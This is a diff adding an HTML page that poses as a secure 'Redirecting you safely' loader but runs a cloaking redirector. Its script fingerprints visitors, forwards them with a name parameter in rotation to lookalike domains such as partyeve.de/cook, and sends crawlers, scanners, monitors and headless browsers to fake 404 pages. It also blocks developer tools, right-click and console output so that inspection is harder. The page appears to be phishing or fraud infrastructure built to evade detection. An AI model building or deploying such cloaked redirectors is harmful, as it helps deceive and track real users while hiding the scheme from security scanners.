@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    
+    <!-- Anti-Indexing Meta Tags -->
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+    <meta name="slurp" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+    <meta name="duckduckbot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+    <meta name="baiduspider" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+    <meta name="yandexbot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+    <meta name="facebookexternalhit" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+    <meta name="twitterbot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+    <meta name="linkedinbot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+    <meta name="whatsapp" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+    <meta name="telegrambot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+    
+    <!-- Additional Anti-Indexing -->
+    <meta name="referrer" content="no-referrer">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="theme-color" content="#667eea">
+    
+    <!-- Anti-Bot Detection -->
+    <meta name="generator" content="">
+    <meta name="author" content="">
+    <meta name="description" content="">
+    <meta name="keywords" content="">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .loader-container {
+            text-align: center;
+            color: white;
+            z-index: 10;
+        }
+        
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            font-size: 24px;
+            margin-bottom: 15px;
+            opacity: 0.9;
+            font-weight: 300;
+        }
+        
+        .progress-container {
+            width: 300px;
+            margin: 30px auto;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 3px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4CAF50, #8BC34A, #FFC107);
+            border-radius: 3px;
+            animation: progress 3s ease-in-out;
+            position: relative;
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        
+        .redirect-info {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 14px;
+            opacity: 0.8;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px 20px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .security-badge {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(76, 175, 80, 0.9);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+            backdrop-filter: blur(10px);
+        }
+        
+        @media (max-width: 768px) {
+            .loading-text { font-size: 20px; }
+            .progress-container { width: 250px; }
+            .redirect-info { font-size: 12px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="security-badge">🔒 Secure Connection</div>
+    
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <div class="loading-text">Redirecting you safely</div>
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="redirect-info">
+        <span id="redirect-timer">3</span> seconds • <span id="session-id">Loading...</span>
+    </div>
+
+    <script src="analytics-tracker.js"></script>
+    <script>
+        // 🚀 Secure Advanced Redirector System v3.0
+        class SecureRedirector {
+            constructor() {
+                // 🔧 Configuration - YOUR ACTUAL DOMAINS
+                this.domains = [
+                    'https://partyeve.de/cook',
+                    'https://partieve.de/cook', 
+                    'https://vipinvite.de/cook'
+                ];
+                
+                // Anti-Bot Detection Patterns
+                this.botPatterns = [
+                    /bot/i, /crawler/i, /spider/i, /scraper/i, /curl/i, /wget/i,
+                    /python/i, /java/i, /php/i, /perl/i, /ruby/i, /go-http/i,
+                    /googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i, /baiduspider/i,
+                    /yandexbot/i, /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
+                    /whatsapp/i, /telegrambot/i, /discordbot/i, /slackbot/i,
+                    /amazonbot/i, /applebot/i, /msnbot/i, /yahoo/i, /ask/i,
+                    /archive/i, /wayback/i, /ia_archiver/i, /web.archive/i,
+                    /screenshot/i, /headless/i, /phantom/i, /selenium/i,
+                    /puppeteer/i, /playwright/i, /chrome-lighthouse/i,
+                    /gtmetrix/i, /pingdom/i, /uptimerobot/i, /statuscake/i,
+                    /monitor/i, /check/i, /test/i, /scan/i, /probe/i
+                ];
+                
+                this.currentIndex = this.getStoredIndex();
+                this.sessionId = this.generateSessionId();
+                this.startTime = Date.now();
+                this.userFingerprint = this.generateFingerprint();
+                
+                // Anti-Bot Check
+                if (this.isBot()) {
+                    this.handleBot();
+                    return;
+                }
+                
+                this.init();
+            }
+            
+            isBot() {
+                const userAgent = navigator.userAgent.toLowerCase();
+                
+                // Check user agent patterns
+                if (this.botPatterns.some(pattern => pattern.test(userAgent))) {
+                    return true;
+                }
+                
+                // Check for headless browser indicators
+                if (this.isHeadlessBrowser()) {
+                    return true;
+                }
+                
+                // Check for automation tools
+                if (this.isAutomationTool()) {
+                    return true;
+                }
+                
+                // Check for suspicious behavior
+                if (this.hasSuspiciousBehavior()) {
+                    return true;
+                }
+                
+                return false;
+            }
+            
+            isHeadlessBrowser() {
+                const headlessIndicators = [
+                    'headless', 'phantom', 'selenium', 'puppeteer', 'playwright',
+                    'chrome-lighthouse', 'webdriver', 'automation'
+                ];
+                
+                const userAgent = navigator.userAgent.toLowerCase();
+                return headlessIndicators.some(indicator => userAgent.includes(indicator));
+            }
+            
+            isAutomationTool() {
+                const automationIndicators = [
+                    'selenium', 'webdriver', 'puppeteer', 'playwright', 'phantom',
+                    'headless', 'automation', 'test', 'scraper'
+                ];
+                
+                const userAgent = navigator.userAgent.toLowerCase();
+                return automationIndicators.some(indicator => userAgent.includes(indicator));
+            }
+            
+            hasSuspiciousBehavior() {
+                // Check for missing human-like behavior
+                const hasMouseMovement = sessionStorage.getItem('human_interaction') === 'true';
+                const hasScroll = sessionStorage.getItem('human_scroll') === 'true';
+                
+                // If no human interaction detected within 5 seconds, might be a bot
+                setTimeout(() => {
+                    if (!hasMouseMovement && !hasScroll) {
+                        this.handleBot();
+                    }
+                }, 5000);
+                
+                return false;
+            }
+            
+            handleBot() {
+                const fakePages = [
+                    'https://www.google.com/404',
+                    'https://www.bing.com/404',
+                    'https://www.yahoo.com/404',
+                    'https://httpbin.org/status/404'
+                ];
+                
+                const randomFakePage = fakePages[Math.floor(Math.random() * fakePages.length)];
+                
+                setTimeout(() => {
+                    window.location.href = randomFakePage;
+                }, Math.random() * 2000 + 1000);
+                
+                this.logBotAttempt();
+                
+                // Track bot block
+                if (window.analyticsTracker) {
+                    window.analyticsTracker.trackBotBlock();
+                }
+            }
+            
+            logBotAttempt() {
+                const logData = {
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    referrer: document.referrer,
+                    type: 'bot_detected',
+                    sessionId: this.sessionId
+                };
+                
+                this.sendAnalytics(logData);
+            }
+            
+            generateSessionId() {
+                const timestamp = Date.now().toString(36);
+                const random = Math.random().toString(36).substr(2, 9);
+                return `sess_${timestamp}_${random}`;
+            }
+            
+            generateFingerprint() {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('Fingerprint', 2, 2);
+                
+                return btoa(JSON.stringify({
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    canvas: canvas.toDataURL()
+                }));
+            }
+            
+            getStoredIndex() {
+                try {
+                    const stored = localStorage.getItem('redirector_index');
+                    return stored ? parseInt(stored) : 0;
+                } catch (e) {
+                    return 0;
+                }
+            }
+            
+            setStoredIndex(index) {
+                try {
+                    localStorage.setItem('redirector_index', index.toString());
+                } catch (e) {
+                    console.warn('Could not save index to localStorage');
+                }
+            }
+            
+            getNextDomain() {
+                const domain = this.domains[this.currentIndex];
+                this.currentIndex = (this.currentIndex + 1) % this.domains.length;
+                this.setStoredIndex(this.currentIndex);
+                
+                // Add name parameter if present
+                const nameParam = this.getNameParameter();
+                if (nameParam) {
+                    const separator = domain.includes('?') ? '&' : '?';
+                    return domain + separator + 'name=' + encodeURIComponent(nameParam);
+                }
+                
+                return domain;
+            }
+            
+            getNameParameter() {
+                const urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get('name');
+            }
+            
+            logRedirect(domain) {
+                const logData = {
+                    sessionId: this.sessionId,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    referrer: document.referrer,
+                    domain: domain,
+                    index: this.currentIndex - 1,
+                    timeOnPage: Date.now() - this.startTime,
+                    fingerprint: this.userFingerprint,
+                    nameParameter: this.getNameParameter(),
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        colorDepth: screen.colorDepth
+                    },
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack
+                };
+                
+                this.sendAnalytics(logData);
+                this.storeLog(logData);
+            }
+            
+            storeLog(logData) {
+                try {
+                    const logs = JSON.parse(localStorage.getItem('redirector_logs') || '[]');
+                    logs.push(logData);
+                    if (logs.length > 50) logs.shift();
+                    localStorage.setItem('redirector_logs', JSON.stringify(logs));
+                } catch (e) {
+                    console.warn('Could not store log data');
+                }
+            }
+            
+            sendAnalytics(data) {
+                try {
+                    fetch('/api/analytics', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data)
+                    }).catch(() => {
+                        // Silently fail if analytics endpoint is not available
+                    });
+                } catch (e) {
+                    // Silently fail
+                }
+            }
+            
+            addRandomDelay() {
+                return Math.random() * 1500 + 1000;
+            }
+            
+            updateSessionDisplay() {
+                const sessionElement = document.getElementById('session-id');
+                if (sessionElement) {
+                    sessionElement.textContent = this.sessionId.substring(0, 12) + '...';
+                }
+            }
+            
+            addProtection() {
+                // Disable right-click
+                document.addEventListener('contextmenu', e => e.preventDefault());
+                
+                // Disable dev tools
+                document.addEventListener('keydown', e => {
+                    if (e.key === 'F12' || 
+                        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                        (e.ctrlKey && e.key === 'u') ||
+                        (e.ctrlKey && e.shiftKey && e.key === 'C')) {
+                        e.preventDefault();
+                    }
+                });
+                
+                // Disable text selection
+                document.addEventListener('selectstart', e => e.preventDefault());
+                
+                // Add mouse movement tracking
+                let mouseMovements = 0;
+                document.addEventListener('mousemove', () => {
+                    mouseMovements++;
+                    if (mouseMovements > 5) {
+                        sessionStorage.setItem('human_interaction', 'true');
+                    }
+                });
+                
+                // Add scroll tracking
+                let scrollEvents = 0;
+                window.addEventListener('scroll', () => {
+                    scrollEvents++;
+                    if (scrollEvents > 2) {
+                        sessionStorage.setItem('human_scroll', 'true');
+                    }
+                });
+            }
+            
+            obfuscateCode() {
+                const noop = () => {};
+                const methods = ['log', 'debug', 'info', 'warn', 'error', 'trace'];
+                methods.forEach(method => {
+                    console[method] = noop;
+                });
+                
+                if (window.console) {
+                    window.console.clear = noop;
+                    window.console.table = noop;
+                    window.console.group = noop;
+                    window.console.groupEnd = noop;
+                }
+            }
+            
+            init() {
+                const targetDomain = this.getNextDomain();
+                this.logRedirect(targetDomain);
+                this.updateSessionDisplay();
+                this.addProtection();
+                this.obfuscateCode();
+                
+                // Track analytics
+                if (window.analyticsTracker) {
+                    window.analyticsTracker.trackRedirect(targetDomain, true);
+                }
+                
+                // Update redirect timer
+                const timerElement = document.getElementById('redirect-timer');
+                let seconds = 2;
+                
+                const countdown = setInterval(() => {
+                    seconds--;
+                    if (timerElement) {
+                        timerElement.textContent = seconds;
+                    }
+                    if (seconds <= 0) {
+                        clearInterval(countdown);
+                    }
+                }, 1000);
+                
+                // Redirect after delay
+                setTimeout(() => {
+                    const finalDelay = this.addRandomDelay();
+                    setTimeout(() => {
+                        if (Math.random() < 0.1) {
+                            setTimeout(() => {
+                                window.location.href = targetDomain;
+                            }, Math.random() * 1000);
+                        } else {
+                            window.location.href = targetDomain;
+                        }
+                    }, finalDelay);
+                }, 2000);
+            }
+        }
+        
+        // Initialize redirector when page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            new SecureRedirector();
+        });
+        
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            sessionStorage.clear();
+        });
+    </script>
+</body>
+</html>
